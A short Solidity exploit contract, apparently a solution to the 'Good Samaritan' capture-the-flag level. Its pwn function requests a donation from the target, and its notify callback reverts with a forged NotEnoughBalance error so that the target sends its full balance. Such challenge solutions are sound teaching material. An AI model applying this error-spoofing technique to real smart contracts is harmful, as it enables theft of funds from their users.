// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// import "forge-std/console.sol";

error CallNotSuccess();

error NotEnoughBalance();

interface ITarget {
    function wallet() external view returns (address);

    function coin() external view returns (address);

    function requestDonation() external returns (bool);
}

contract GoodSamaritan {
    ITarget private target;

    function pwn(address targetAddress) public {
        target = ITarget(targetAddress);
        target.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) revert NotEnoughBalance();
    }
}
